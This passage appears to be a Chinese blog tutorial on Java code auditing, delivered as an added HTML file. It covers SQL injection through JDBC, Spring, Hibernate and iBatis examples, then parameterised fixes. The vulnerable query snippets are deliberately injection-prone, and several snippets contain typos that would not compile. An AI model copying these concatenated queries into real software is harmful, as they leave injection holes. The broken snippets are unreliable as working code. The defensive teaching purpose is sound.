@@ -1,0 +1,2517 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Safe: Java 代码审计</title>
+<meta name="description" content="kubernetes, linux" />
+<meta name="keywords" content="kubernetes, linux" />
+<meta name="generator" content="Org Mode" />
+<script>
+/* main.css 默认把 body 隐藏起来，为的是切换深色模式时不闪白。
+   恢复可见完全交给 CSS 的 html.js:not(.ready) 选择器控制：
+   - 没有 JS：下面这句不会执行，html 上没有 .js，body 一开始就是可见的
+   - 有 JS 但 main.js 加载失败或抛异常：load 事件（或 2 秒兜底）照样会加上 .ready
+   任何一条路径都不会留下白屏。 */
+(function () {
+  var el = document.documentElement;
+  el.className += ' js';
+  function reveal() { el.className += ' ready'; }
+  window.addEventListener('load', reveal);
+  setTimeout(reveal, 2000);
+})();
+</script>
+<link rel="icon" href="/favicon.ico" type="image/x-icon">
+<link rel="alternate" type="application/rss+xml" title="Jasper Hsu's Blog" href="https://xuchangwei.com/rss.xml">
+<link rel="me" href="https://emacs.ch/@jasperhsu">
+<meta name="google-adsense-account" content="ca-pub-1741779893655624">
+<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-1741779893655624" crossorigin="anonymous"></script>
+<!-- from -->
+<!--
+<style>#back-to-top{background:#000;-webkit-border-radius:50%;-moz-border-radius:50%;border-radius:50%;bottom:20px;-webkit-box-shadow:0 2px 5px 0 rgba(0,0,0,.26);-moz-box-shadow:0 2px 5px 0 rgba(0,0,0,.26);box-shadow:0 2px 5px 0 rgba(0,0,0,.26);color:#fff;cursor:pointer;display:block;height:56px;opacity:1;outline:0;position:fixed;right:20px;-webkit-tap-highlight-color:transparent;-webkit-touch-callout:none;-webkit-transition:bottom .2s,opacity .2s;-o-transition:bottom .2s,opacity .2s;-moz-transition:bottom .2s,opacity .2s;transition:bottom .2s,opacity .2s;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;width:56px;z-index:1}#back-to-top svg{display:block;fill:currentColor;height:24px;margin:16px auto 0;width:24px}#back-to-top.hidden{bottom:-56px;opacity:0}</style>
+-->
+<link rel="stylesheet" href="/static/distro-htmlize.css">
+<link rel="stylesheet" href="/static/aandds.com/css/main.css">
+<link rel="stylesheet" href="/static/aandds.com/css/drollery.min.css">
+<script type="text/javascript" src="/static/aandds.com/js/main.js"></script>
+</head>
+<body>
+<div id="content" class="content">
+<header>
+<h1 class="title">Safe: Java 代码审计</h1>
+</header><nav id="table-of-contents" role="doc-toc">
+<h2>&#30446;&#24405;</h2>
+<div id="text-table-of-contents" role="doc-toc">
+<ul>
+<li><a href="#h:4dc34abe-7dd5-498c-b4fd-f212ad8ad6aa">SQL 注入</a>
+<ul>
+<li><a href="#h:e2b3e864-9f6a-4253-83a6-82a02c45da3d">代码示例</a>
+<ul>
+<li><a href="#h:0163bdaf-c550-4ba6-8934-23f5e387b491">JDBC</a></li>
+<li><a href="#h:1affcb25-cb08-4080-bacb-232e332a49c7">Statement接口常用方法：</a></li>
+<li><a href="#h:c0185cb2-6770-4f14-ba9b-656488a86dd3">JDBC使用预编译</a></li>
+</ul>
+</li>
+<li><a href="#h:32749803-eb78-43d5-9922-4a8181d78f7c">主流的 Java ORM 框架</a>
+<ul>
+<li><a href="#h:e7603282-0c60-408d-ab06-554a95919e8b">Hibernate</a>
+<ul>
+<li><a href="#h:2099e2eb-beec-49bc-a336-b47082e8cf1f">Hibernate预编译</a></li>
+</ul>
+</li>
+<li><a href="#h:489463e7-3983-4a5d-956f-65f929f74413">MyBatis</a>
+<ul>
+<li><a href="#h:2aad10ff-ece9-401e-ac8a-fc8566cc6382">MyBatis 示例</a></li>
+</ul>
+</li>
+<li><a href="#h:39836fa6-995b-4c0a-948f-a6211e7179fc">JdbcTemplate</a></li>
+</ul>
+</li>
+<li><a href="#h:be043971-0d53-4e05-97de-5375c0acf721">解决方案</a></li>
+</ul>
+</li>
+<li><a href="#h:2820635d-23ab-4b5f-9349-8538aeeb767a">命令执行</a>
+<ul>
+<li><a href="#h:5a9ea6ec-3182-43ce-8570-e21a88ceb2d3">解决方案</a></li>
+</ul>
+</li>
+<li><a href="#h:ac2013bf-c814-4784-b33d-8264861dc612">文件上传</a>
+<ul>
+<li><a href="#h:bb0bd9d5-4ade-49fb-a2cd-cf06c0040e52">解决方案</a></li>
+</ul>
+</li>
+<li><a href="#h:06fc75b8-f7f9-4e4b-ac84-1f145cc5f07a">重定向</a>
+<ul>
+<li><a href="#h:ed9622ff-b2dd-4fa3-b12b-96288f415437">解决方案</a></li>
+</ul>
+</li>
+<li><a href="#h:6206af53-fb6c-43d2-9ded-5ed17b1cd2dc">CSRF</a>
+<ul>
+<li><a href="#h:ac2295cd-c04f-44e9-8a4c-0cd06f188802">解决方案</a></li>
+</ul>
+</li>
+<li><a href="#h:07737c63-bf26-405b-bd89-d8691505ea91">SSRF</a>
+<ul>
+<li><a href="#h:3fa31637-f67e-4c07-8f9a-953937d03de7">解决方案</a></li>
+</ul>
+</li>
+<li><a href="#h:fb8a6017-5fcc-483a-b82c-a3481dbba8ad">XSS</a>
+<ul>
+<li><a href="#h:fabd7c38-6363-4c61-8973-bb4ef9e1a513">解决方案</a></li>
+</ul>
+</li>
+<li><a href="#h:e655c591-dc83-4318-9886-a7fdba96e742">XXE</a></li>
+<li><a href="#h:1a2bb8fa-8a6a-4655-8a45-d4da9f954564">反序列化漏洞</a>
+<ul>
+<li><a href="#Fastjson反序列化">Fastjson反序列化</a></li>
+</ul>
+</li>
+<li><a href="#h:8dae0942-47ab-40be-ad06-5a54cb800b13">审计工具-Cobra</a>
+<ul>
+<li><a href="#h:0d57d80b-36a8-4def-8d6a-2c1877295383">介绍</a></li>
+<li><a href="#h:a4e1c5e6-566a-4df5-8ac1-f937427e5906">Installation(安装)</a></li>
+<li><a href="#h:307d6dd6-29d4-4567-a347-1cc8936c1391">CLI模式</a></li>
+<li><a href="#h:771fffa9-b016-451d-8d04-9b4158278426">API接口</a></li>
+<li><a href="#h:b5c50eaf-045d-4dd8-aa97-fee9586e8fde">完整的例子</a></li>
+<li><a href="#h:c25e0a91-72b6-4664-9d0b-2e7a141b5f66">Flow（规则编写流程）</a></li>
+<li><a href="#h:df846e5b-888a-439e-bc63-a70964cf8a48">Rule Template（规则模板）</a></li>
+<li><a href="#h:72fc1a01-f259-4bda-9c97-cbf07f251d08">Example</a>
+<ul>
+<li><a href="#h:7b479a29-655d-4226-b968-70e1e9bf22ef">使用测试代码进行扫描</a></li>
+<li><a href="#h:9eb76fd5-06f7-4557-8b35-19a4b7cf8427">自定义规则</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</div>
+</nav>
+<ul class="org-ul">
+<li>TAGS: <a href="../index.html">Safe</a></li>
+</ul>
+
+<p>
+<a href="13-code-auditing-of-java-01.html">Java语言入门</a>
+</p>
+
+<p>
+主要内容：
+</p>
+<ul class="org-ul">
+<li>SQL 注入</li>
+<li>命令执行</li>
+<li>XSS</li>
+<li>XXE</li>
+<li>CSRF</li>
+<li>SSRF</li>
+<li>重定向</li>
+<li>上件上传</li>
+<li>Jsonp劫持</li>
+<li>反序列化</li>
+<li>自动化代码审计</li>
+<li>Cobra
+<ul class="org-ul">
+<li>什么是"源代码安全审计(白盒扫描)"</li>
+<li>Cobra 为什么能从源代码中扫描漏洞</li>
+</ul></li>
+</ul>
+<section id="outline-container-h:4dc34abe-7dd5-498c-b4fd-f212ad8ad6aa" class="outline-2">
+<h2 id="h:4dc34abe-7dd5-498c-b4fd-f212ad8ad6aa"><a href="#h:4dc34abe-7dd5-498c-b4fd-f212ad8ad6aa">SQL 注入</a></h2>
+<div class="outline-text-2" id="text-h:4dc34abe-7dd5-498c-b4fd-f212ad8ad6aa">
+<p>
+<b>安全威胁</b>
+</p>
+
+<p>
+SQL injection，SQL 注入攻击。
+</p>
+
+<p>
+当应用程序将用户输入的内容，拼接到 SQL 语句中，一起提交给数据库执行时，就会产生 SQL 注入威胁。
+</p>
+
+<p>
+由于用户的输入，也是 SQL 语句的一部分，所以攻击者可以利用这部分可以控制的内容，注入自己定义的语句，改变 SQL 语句执行逻辑，让数据库执行任意自己需要的指令。通过控制部分 SQL 语句，攻击者可以查询数据库中任何自己需要的数据，利用数据库的一些特性，可以直接获取数据库服务器的系统权限。
+</p>
+</div>
+<div id="outline-container-h:e2b3e864-9f6a-4253-83a6-82a02c45da3d" class="outline-3">
+<h3 id="h:e2b3e864-9f6a-4253-83a6-82a02c45da3d"><a href="#h:e2b3e864-9f6a-4253-83a6-82a02c45da3d">代码示例</a></h3>
+<div class="outline-text-3" id="text-h:e2b3e864-9f6a-4253-83a6-82a02c45da3d">
+<p>
+只要支持 JDBC 查询，并且开发人员使用了语句拼接，都会产生这种漏洞。
+</p>
+</div>
+<div id="outline-container-h:0163bdaf-c550-4ba6-8934-23f5e387b491" class="outline-4">
+<h4 id="h:0163bdaf-c550-4ba6-8934-23f5e387b491"><a href="#h:0163bdaf-c550-4ba6-8934-23f5e387b491">JDBC</a></h4>
+<div class="outline-text-4" id="text-h:0163bdaf-c550-4ba6-8934-23f5e387b491">
+<p>
+1、 <b>驱动类</b> ： com.mysql.cj.jdbc.Driver。
+</p>
+
+<p>
+2、 <b>连接网址</b> ：
+</p>
+
+<p>
+语法：
+</p>
+<div class="org-src-container">
+<pre class="src src-java"><span class="org-string">"jdbc:mysql://hostname:port/dbname"</span>,<span class="org-string">"username"</span>,<span class="org-string">"password"</span>
+</pre>
+</div>
+
+<p>
+<b>MySql 数据库的连接 url</b> ： jdbc:mysql://localhost:3306/dvwa 其中 3306 是端口号，dvwa 是数据库名称。
+</p>
+
+<p>
+3、 <b>username</b> ：MySql数据库的用户名，默认为root。
+</p>
+
+<p>
+4、 <b>Password</b> ： MySql 数据库的密码。
+</p>
+
+<p>
+代码连接前需下载 jdbc 驱动
+MySQL数据库: <a href="https://dev.mysql.com/downloads/connector/j/">https://dev.mysql.com/downloads/connector/j/</a>
+</p>
+
+<p>
+<a href="https://blog.csdn.net/jufengada9/article/details/105203470">Java导入mysql驱动</a>
+</p>
+
+<p>
+Java(jdbc)示例：
+</p>
+<div class="org-src-container">
+<pre class="src src-java"><span class="org-keyword">package</span> <span class="org-constant">codeAnalysis</span>;
+<span class="org-keyword">import</span> <span class="org-constant">java</span>.<span class="org-constant">sql</span>.<span class="org-type">Connection</span>;
+<span class="org-keyword">import</span> <span class="org-constant">java</span>.<span class="org-constant">sql</span>.<span class="org-type">DriverManager</span>;
+<span class="org-doc">/**
+ * This class is used to create a JDBC
+ * connection with MySql DB.
+ *
+ */</span>
+<span class="org-keyword">public</span> <span class="org-keyword">class</span> <span class="org-type">JDBCMySqlTest</span> {
+    <span class="org-comment-delimiter">//</span><span class="org-comment">JDBC and database properties.
+</span>    <span class="org-keyword">private</span> <span class="org-keyword">static</span> <span class="org-keyword">final</span> <span class="org-type">String</span> <span class="org-variable-name">DB_DRIVER</span> =
+        <span class="org-string">"com.mysql.cj.jdbc.Driver"</span>;
+    <span class="org-keyword">private</span> <span class="org-keyword">static</span> <span class="org-keyword">final</span> <span class="org-type">String</span> <span class="org-variable-name">DB_URL</span> =
+        <span class="org-string">"jdbc:mysql://127.0.0.1:33060/dvwa"</span>;
+    <span class="org-keyword">private</span> <span class="org-keyword">static</span> <span class="org-keyword">final</span> <span class="org-type">String</span> <span class="org-variable-name">DB_USERNAME</span> = <span class="org-string">"root"</span>;
+    <span class="org-keyword">private</span> <span class="org-keyword">static</span> <span class="org-keyword">final</span> <span class="org-type">String</span> <span class="org-variable-name">DB_PASSWORD</span> = <span class="org-string">""</span>;
+    <span class="org-keyword">public</span> <span class="org-keyword">static</span> <span class="org-type">void</span> <span class="org-function-name">main</span>(<span class="org-type">String</span> <span class="org-variable-name">args</span>[]){
+        <span class="org-type">Connection</span> <span class="org-variable-name">conn</span> = <span class="org-constant">null</span>;
+        <span class="org-keyword">try</span>{
+            <span class="org-comment-delimiter">//</span><span class="org-comment">Register the JDBC driver
+</span>            Class.forName(DB_DRIVER);
+            <span class="org-comment-delimiter">//</span><span class="org-comment">Open the connection
+</span>            conn = DriverManager.
+                getConnection(DB_URL, DB_USERNAME, DB_PASSWORD);
+            <span class="org-keyword">if</span>(conn != <span class="org-constant">null</span>){
+                System.out.println(<span class="org-string">"Successfully connected."</span>);
+            }<span class="org-keyword">else</span>{
+                System.out.println(<span class="org-string">"Failed to connect."</span>);
+            }
+        }<span class="org-keyword">catch</span>(Exception e){
+            e.printStackTrace();
+        }
+    }
+}
+</pre>
+</div>
+
+<p>
+JDBC 语句用于对数据库执行查询。语句是一个接口，它提供了执行查询的方法。我们可以通过调用 Connection接口的 createStatement() 方法得到一个语句对象。
+</p>
+</div>
+</div>
+<div id="outline-container-h:1affcb25-cb08-4080-bacb-232e332a49c7" class="outline-4">
+<h4 id="h:1affcb25-cb08-4080-bacb-232e332a49c7"><a href="#h:1affcb25-cb08-4080-bacb-232e332a49c7">Statement接口常用方法：</a></h4>
+<div class="outline-text-4" id="text-h:1affcb25-cb08-4080-bacb-232e332a49c7">
+<ul class="org-ul">
+<li>execute(String SQL)：用于执行SQL DDL语句。</li>
+</ul>
+<div class="org-src-container">
+<pre class="src src-java"><span class="org-keyword">public</span> <span class="org-type">boolean</span> <span class="org-function-name">execute</span>(<span class="org-type">String</span> <span class="org-variable-name">SQL</span>)
+</pre>
+</div>
+
+<ul class="org-ul">
+<li>executeQuery(String SQL)：用于执行选择查询，返回一个ResultSet对象。</li>
+</ul>
+<div class="org-src-container">
+<pre class="src src-java"><span class="org-keyword">public</span> <span class="org-type">ResultSet</span> <span class="org-function-name">executeQuery</span>(<span class="org-type">String</span> <span class="org-variable-name">SQL</span>)
+</pre>
+</div>
+
+<ul class="org-ul">
+<li>executeUpdate(String SQL *) ： *用于执行插入、更新、删除等查询，返回编号。受影响的行数。</li>
+</ul>
+<div class="org-src-container">
+<pre class="src src-java"><span class="org-keyword">public</span> <span class="org-type">int</span> <span class="org-function-name">executeUpdate</span>(<span class="org-type">String</span> <span class="org-variable-name">SQL</span>)
+</pre>
+</div>
+
+<ul class="org-ul">
+<li>executeBatch()：用于批量执行命令。</li>
+</ul>
+<div class="org-src-container">
+<pre class="src src-java"><span class="org-keyword">public</span> <span class="org-type">int</span>[] <span class="org-function-name">executeBatch</span>()
+</pre>
+</div>
+
+
+<p>
+示例：
+</p>
+<div class="org-src-container">
+<pre class="src src-java"><span class="org-type">Statement</span> <span class="org-variable-name">statement</span> = connection.createStatement();
+<span class="org-type">String</span> <span class="org-variable-name">sql</span> = <span class="org-string">"SELECT * FROM crawler_article"</span>;
+<span class="org-type">ResultSet</span> <span class="org-variable-name">rs</span> =statement.executeQuery(sql);
+</pre>
+</div>
+
+<p>
+示例
+</p>
+<div class="org-src-container">
+<pre class="src src-java"><span class="org-comment-delimiter">//</span><span class="org-comment">&#22914;&#26524;@GetMapping("/hello")&#19979;&#26041;&#27861;&#21442;&#25968;&#26159;&#36825;&#26679;&#65292;&#23601;&#20195;&#34920;&#25152;&#26377;&#36755;&#20837;&#37117;&#22312;request&#20013;
+</span><span class="org-type">HttpServletRequest</span> <span class="org-variable-name">request</span>, <span class="org-variable-name">HttpServletResponse</span> response) { <span class="org-type">JdbcConnection</span> <span class="org-variable-name">conn</span> = <span class="org-keyword">new</span> <span class="org-type">JdbcConnection</span>();
+
+<span class="org-keyword">final</span> <span class="org-type">String</span> <span class="org-variable-name">sql</span> = <span class="org-string">"select \* from product where pname like '%"</span> + request.getParameter(<span class="org-string">"pname"</span>) + <span class="org-string">"%'"</span>;
+
+conn.execqueryResultSet(sql);
+<span class="org-comment-delimiter">// </span><span class="org-comment">&#20351;&#29992;+&#21152;&#21495;&#25340;&#25509;&#65292;&#20250;&#26377;sql&#27880;&#20837;</span>
+</pre>
+</div>
+
+<p>
+示例
+</p>
+<div class="org-src-container">
+<pre class="src src-sh">src
+&#9500;&#9472;main
+&#9474; &#9500;
+&#9474; &#9500;&#9472;java
+&#9474; &#9474; &#9500;&#9472;com.example.springdemo
+&#9474; &#9474; &#9474; &#9500;&#9472;controller
+&#9474; &#9474; &#9474; &#9474; &#9500;&#9472;UserController
+&#9474; &#9474; &#9474; &#9500;&#9472;dao
+&#9474; &#9474; &#9474; &#9474; &#9500;&#9472;QueryDao
+&#9474; &#9474; &#9474; &#9500;&#9472;service
+&#9474; &#9474; &#9474; &#9474; &#9500;&#9472;QueryService
+</pre>
+</div>
+
+<div class="org-src-container">
+<pre class="src src-java"><span class="org-comment-delimiter">//</span><span class="org-comment">QueryService.java
+</span><span class="org-keyword">package</span> com.example.springdemo.<span class="org-constant">service</span>;
+<span class="org-keyword">import</span> <span class="org-constant">com</span>.<span class="org-constant">example</span>.<span class="org-constant">springdemo</span>.<span class="org-constant">dao</span>.<span class="org-type">QueryDao</span>;
+
+<span class="org-keyword">public</span> <span class="org-keyword">class</span> <span class="org-type">QueryService</span> {
+    <span class="org-keyword">public</span> <span class="org-type">void</span> <span class="org-function-name">QueryDVWA</span>(<span class="org-type">String</span> <span class="org-variable-name">name</span>) {
+    <span class="org-type">QueryDao</span> <span class="org-variable-name">queryDao</span> = <span class="org-keyword">new</span> <span class="org-type">QueryDao</span>();
+        queryDao.query(name);
+    }
+}
+</pre>
+</div>
+
+<div class="org-src-container">
+<pre class="src src-java"><span class="org-keyword">package</span> com.example.springdemo.<span class="org-constant">dao</span>;
+
+<span class="org-keyword">import</span> <span class="org-constant">java</span>.<span class="org-constant">sql</span>.<span class="org-type">Connection</span>;
+<span class="org-keyword">import</span> <span class="org-constant">java</span>.<span class="org-constant">sql</span>.<span class="org-type">DriverManager</span>;
+
+<span class="org-keyword">public</span> <span class="org-keyword">class</span> <span class="org-type">QueryDao</span> {
+    <span class="org-keyword">public</span> <span class="org-type">void</span> <span class="org-function-name">query</span>(<span class="org-type">String</span> <span class="org-variable-name">name</span>) {
+        conn = DriverManager.getConnectron( <span class="org-string">"xxx"</span>, <span class="org-string">"xxxx"</span>, <span class="org-string">"xxx"</span>);
+        conn.excutequery(<span class="org-string">"select * from users where name = "</span> + name);  <span class="org-comment-delimiter">//</span><span class="org-comment">&#29305;&#24449;&#26126;&#26174;&#65292;SQL&#25340;&#25509;&#65292;&#26377;SQL&#27880;&#20837;&#21361;&#38505;
+</span>    }
+}
+</pre>
+</div>
+
+<div class="org-src-container">
+<pre class="src src-java"><span class="org-comment-delimiter">// </span><span class="org-comment">UserController.java
+</span><span class="org-keyword">package</span> com.examle.springdemo.<span class="org-constant">controller</span>;
+
+<span class="org-keyword">import</span> <span class="org-constant">org</span>.<span class="org-constant">springframework</span>.<span class="org-constant">web</span>.<span class="org-constant">bind</span>.<span class="org-constant">annotation</span>.*;
+<span class="org-keyword">import</span> <span class="org-constant">com</span>.<span class="org-constant">example</span>.<span class="org-constant">springdemo</span>.<span class="org-constant">service</span>.<span class="org-type">QueryService</span>;
+
+<span class="org-c-annotation">@RestController</span>
+<span class="org-keyword">public</span> <span class="org-keyword">class</span> <span class="org-type">UserController</span> {
+
+    <span class="org-c-annotation">@GetMapping</span>(<span class="org-string">"/hello"</span>)
+    <span class="org-keyword">public</span> String <span class="org-type">hello</span>(<span class="org-c-annotation">@RequestParam</span>(value=<span class="org-string">"name, defaultValue = "</span>world<span class="org-warning">"</span><span class="org-string">) String name) {</span><span class="org-warning">
+</span>        QueryService queryService = <span class="org-keyword">new</span> <span class="org-type">QueryService</span>();
+        <span class="org-constant">queryService</span>.QeryDVWA(<span class="org-type">name</span>);  <span class="org-comment-delimiter">//</span><span class="org-comment">&#36825;&#37324;
+</span>        <span class="org-keyword">return</span> String.format(<span class="org-string">"Hello %s!"</span>, <span class="org-type">name</span>);
+    }
+    
+    <span class="org-c-annotation">@PostMapping</span>(<span class="org-string">"/posthello"</span>)
+    <span class="org-keyword">public</span> <span class="org-type">String</span> <span class="org-function-name">postHello</span>(<span class="org-type">String</span> <span class="org-variable-name">name</span>) { <span class="org-keyword">return</span> String.format(<span class="org-string">"Hello %s!"</span>, <span class="org-type">name</span>); }
+    
+    <span class="org-c-annotation">@RequestMapping</span>(<span class="org-string">"/requesthello"</span>)
+    <span class="org-keyword">public</span> <span class="org-type">String</span> <span class="org-function-name">requestHello</span>(<span class="org-type">String</span> <span class="org-variable-name">name</span>) { <span class="org-keyword">return</span> String.format(<span class="org-string">"Hello %s!"</span>, <span class="org-type">name</span>); }
+}
+</pre>
+</div>
+</div>
+</div>
+<div id="outline-container-h:c0185cb2-6770-4f14-ba9b-656488a86dd3" class="outline-4">
+<h4 id="h:c0185cb2-6770-4f14-ba9b-656488a86dd3"><a href="#h:c0185cb2-6770-4f14-ba9b-656488a86dd3">JDBC使用预编译</a></h4>
+<div class="outline-text-4" id="text-h:c0185cb2-6770-4f14-ba9b-656488a86dd3">
+<div class="org-src-container">
+<pre class="src src-java"><span class="org-keyword">public</span> <span class="org-keyword">static</span> <span class="org-type">void</span> <span class="org-function-name">main</span>(<span class="org-type">String</span>[] <span class="org-variable-name">args</span>) {
+    <span class="org-keyword">try</span> {
+        <span class="org-keyword">final</span> <span class="org-type">String</span> <span class="org-variable-name">driverClassName</span> = <span class="org-string">"com.mysql.cj.jdbc.Driver"</span>;
+        <span class="org-keyword">final</span> <span class="org-type">String</span> <span class="org-variable-name">url</span> = <span class="org-string">"jdbc:mysql://127.0.0.1:33060/dvwa"</span>;
+        <span class="org-keyword">final</span> <span class="org-type">String</span> <span class="org-variable-name">username</span> = <span class="org-string">"cici"</span>;
+        <span class="org-keyword">final</span> <span class="org-type">String</span> <span class="org-variable-name">password</span> = <span class="org-string">"123456"</span>;
+        <span class="org-type">Connection</span> <span class="org-variable-name">connection</span> = DriverManager.getConnection(url2, username, password);
+        <span class="org-type">String</span> <span class="org-variable-name">sql</span> = <span class="org-string">" SELECT *\n"</span> +
+            <span class="org-string">" FROM cici\n"</span> +
+            <span class="org-string">" WHERE id = ? and name like ?"</span>;
+        Class.forName(driverClassName);
+        <span class="org-type">PreparedStatement</span> <span class="org-variable-name">preparedStatement</span> = connection.prepareStatement(sql);
+        preparedStatement.setInt(1, 1);
+        preparedStatement.setString(2, <span class="org-string">"%ing%"</span>);  <span class="org-comment-delimiter">// </span><span class="org-comment">&#27809;&#26377;&#28431;&#27934;&#12290; &#22914;&#26524; &#26159;  like concat('%', ?, '%') &#23601;&#26377;&#28431;&#27934;&#20102;
+</span>        <span class="org-type">ResultSet</span> <span class="org-variable-name">rst</span> = preparedStatement.executeQuery();
+        rst.next();
+        System.out.println(rst.getString(2));
+    } <span class="org-keyword">catch</span> (Exception e) {
+        e.printStackTrace();
+    }
+}
+</pre>
+</div>
+
+<p>
+Java(ibatis)示例 xml中写法
+</p>
+<ul class="org-ul">
+<li>#符号的是预编译</li>
+<li>$符号的是拼接</li>
+</ul>
+
+<div class="org-src-container">
+<pre class="src src-xml"><span class="org-nxml-tag-delimiter">&lt;</span><span class="org-nxml-element-local-name">select</span> <span class="org-nxml-attribute-local-name">id</span>=<span class="org-string">"unsafe"</span> <span class="org-nxml-attribute-local-name">resultMap</span>=<span class="org-string">"myResultMap"</span><span class="org-nxml-tag-delimiter">&gt;</span><span class="org-nxml-text">
+select * from table where name like '%$value$%'
+</span><span class="org-nxml-tag-delimiter">&lt;</span><span class="org-nxml-tag-slash">/</span><span class="org-nxml-element-local-name">select</span><span class="org-nxml-tag-delimiter">&gt;</span><span class="org-nxml-text">
+
+UnSafeBean b = sqlMap.queryForObject("value", request.getParameter("name"));</span>
+</pre>
+</div>
+</div>
+</div>
+</div>
+<div id="outline-container-h:32749803-eb78-43d5-9922-4a8181d78f7c" class="outline-3">
+<h3 id="h:32749803-eb78-43d5-9922-4a8181d78f7c"><a href="#h:32749803-eb78-43d5-9922-4a8181d78f7c">主流的 Java ORM 框架</a></h3>
+<div class="outline-text-3" id="text-h:32749803-eb78-43d5-9922-4a8181d78f7c">
+<p>
+当前 Java ORM 框架产品有很多，常见的框架有 Hibernate 和 MyBatis，其主要区别如下。
+</p>
+</div>
+<div id="outline-container-h:e7603282-0c60-408d-ab06-554a95919e8b" class="outline-4">
+<h4 id="h:e7603282-0c60-408d-ab06-554a95919e8b"><a href="#h:e7603282-0c60-408d-ab06-554a95919e8b">Hibernate</a></h4>
+<div class="outline-text-4" id="text-h:e7603282-0c60-408d-ab06-554a95919e8b">
+<p>
+Hibernate 框架是一个全表映射的框架。通常开发者只要定义好持久化对象到数据库表的映射关系，就可以通过Hibernate 框架提供的方法完成持久层操作。
+</p>
+
+<p>
+开发者并不需要熟练地掌握 SQL 语句的编写，Hibernate 框架会根据编制的存储逻辑，自动生成对应的 SQL，并调用 JDBC 接口来执行，所以其开发效率会高于 MyBatis 框架。
+</p>
+
+<p>
+然而Hibernate框架自身也存在一些缺点，例如：
+</p>
+<ul class="org-ul">
+<li>多表关联时，对 SQL 查询的支持较差；</li>
+<li>更新数据时，需要发送所有字段；</li>
+<li>不支持存储过程；</li>
+<li>不能通过优化 SQL 来优化性能。</li>
+</ul>
+
+<p>
+这些问题导致其只适合在场景不太复杂且对性能要求不高的项目中使用。
+</p>
+
+<p>
+Hibernate 官网：<a href="http://hibernate.org/">http://hibernate.org/</a>
+</p>
+
+<p>
+<b>Hibernate执行sql语句</b>
+</p>
+<div class="org-src-container">
+<pre class="src src-java">usernameString<span class="org-comment-delimiter">//</span><span class="org-comment">&#21069;&#21488;&#36755;&#20837;&#30340;&#29992;&#25143;&#21517;
+</span>passwordString<span class="org-comment-delimiter">//</span><span class="org-comment">&#21069;&#21488;&#36755;&#20837;&#30340;&#23494;&#30721;
+</span><span class="org-comment-delimiter">//</span><span class="org-comment">hql&#35821;&#21477;
+</span><span class="org-type">String</span> <span class="org-variable-name">queryString</span> = <span class="org-string">"from User t where t.username= "</span> + usernameString + <span class="org-string">" and t.password="</span>+ passwordString;
+<span class="org-comment-delimiter">//</span><span class="org-comment">&#25191;&#34892;&#26597;&#35810;
+</span><span class="org-type">List</span> <span class="org-variable-name">result</span> = session.createQuery(queryString).list(); <span class="org-comment-delimiter">//</span><span class="org-comment">createQuery&#21487;&#20197;&#25509;&#25910;&#21407;&#29983;&#30340;sql&#35821;&#21477;</span>
+</pre>
+</div>
+</div>
+<div id="outline-container-h:2099e2eb-beec-49bc-a336-b47082e8cf1f" class="outline-5">
+<h5 id="h:2099e2eb-beec-49bc-a336-b47082e8cf1f"><a href="#h:2099e2eb-beec-49bc-a336-b47082e8cf1f">Hibernate预编译</a></h5>
+<div class="outline-text-5" id="text-h:2099e2eb-beec-49bc-a336-b47082e8cf1f">
+<div class="org-src-container">
+<pre class="src src-java">usernameString<span class="org-comment-delimiter">//</span><span class="org-comment">&#21069;&#21488;&#36755;&#20837;&#30340;&#29992;&#25143;&#21517;
+</span>passwordString<span class="org-comment-delimiter">//</span><span class="org-comment">&#21069;&#21488;&#36755;&#20837;&#30340;&#23494;&#30721;
+</span><span class="org-comment-delimiter">//</span><span class="org-comment">hql&#35821;&#21477;
+</span><span class="org-type">String</span> <span class="org-variable-name">queryString</span> = <span class="org-string">"from User t where t.username: usernameString and t.password: passwordString"</span>;
+
+<span class="org-comment-delimiter">//</span><span class="org-comment">&#25191;&#34892;&#26597;&#35810;
+</span><span class="org-type">List</span> <span class="org-variable-name">result</span> = session.createQuery(queryString)
+    .setString(<span class="org-string">"usernameString "</span>, usernameString )
+    .setString(<span class="org-string">"passwordString"</span>, passwordString)
+    .list();
+
+<span class="org-comment-delimiter">//</span><span class="org-comment">hql&#35821;&#21477;
+</span><span class="org-type">String</span> <span class="org-variable-name">queryString</span> = <span class="org-string">"from User t where t.username=? and t.password=?"</span>;
+<span class="org-comment-delimiter">//</span><span class="org-comment">&#25191;&#34892;&#26597;&#35810;
+</span><span class="org-type">List</span> <span class="org-variable-name">result</span> = session.createQuery(queryString)
+    .setString(0, usernameString )
+    .setString(1, passwordString)
+    .list();
+    
+<span class="org-comment-delimiter">// </span><span class="org-comment">like &#26597;&#35810;
+</span><span class="org-type">String</span> <span class="org-variable-name">query</span>=<span class="org-string">"from UserEntity where mobile like :mobile and name like :name"</span>;
+<span class="org-type">Query</span> <span class="org-variable-name">queryObject</span> = <span class="org-keyword">this</span>.systemService.getSession().createQuery(query);
+
+queryObject.setParameter(<span class="org-string">"mobile"</span>,<span class="org-string">"%"</span>+mobile+<span class="org-string">"%"</span>);
+queryObject.setParameter(<span class="org-string">"name"</span>,<span class="org-string">"%"</span>+name+<span class="org-string">"%"</span> );
+<span class="org-type">List</span>&lt;<span class="org-type">UserEntity</span>&gt; <span class="org-variable-name">userlist</span> = queryObject.list();
+</pre>
+</div>
+</div>
+</div>
+</div>
+<div id="outline-container-h:489463e7-3983-4a5d-956f-65f929f74413" class="outline-4">
+<h4 id="h:489463e7-3983-4a5d-956f-65f929f74413"><a href="#h:489463e7-3983-4a5d-956f-65f929f74413">MyBatis</a></h4>
+<div class="outline-text-4" id="text-h:489463e7-3983-4a5d-956f-65f929f74413">
+<p>
+MyBatis 框架是一个半自动映射的框架。这里所谓的“半自动”是相对于 Hibernate 框架全表映射而言的，MyBatis框架需要手动匹配提供 POJO、SQL 和映射关系，而 Hibernate 框架只需提供 POJO 和映射关系即可。
+</p>
+
+<p>
+与 Hibernate 框架相比，虽然使用 MyBatis 框架手动编写 SQL 要比使用 Hibernate 框架的工作量大，但 MyBatis框架可以配置动态 SQL 并优化 SQL、通过配置决定 SQL 的映射规则，以及支持存储过程等。对于一些复杂的和需要优化性能的项目来说，显然使用 MyBatis 框架更加合适。
+</p>
+
+<p>
